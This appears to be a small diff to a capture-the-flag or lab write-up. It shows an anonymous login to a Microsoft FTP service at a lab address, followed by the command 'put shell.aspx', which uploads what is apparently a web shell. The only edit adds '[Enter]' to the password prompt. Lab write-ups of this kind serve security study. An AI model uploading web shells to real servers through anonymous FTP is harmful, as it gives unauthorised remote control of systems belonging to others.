@@ -218,7 +218,7 @@ Connected to 10.10.10.5.
 220 Microsoft FTP Service
 Name (10.10.10.5:hippoeug): anonymous
 331 Anonymous access allowed, send identity (e-mail name) as password.
-Password:
+Password: [Enter]
 230 User logged in.
 Remote system type is Windows_NT.
 ftp> put shell.aspx
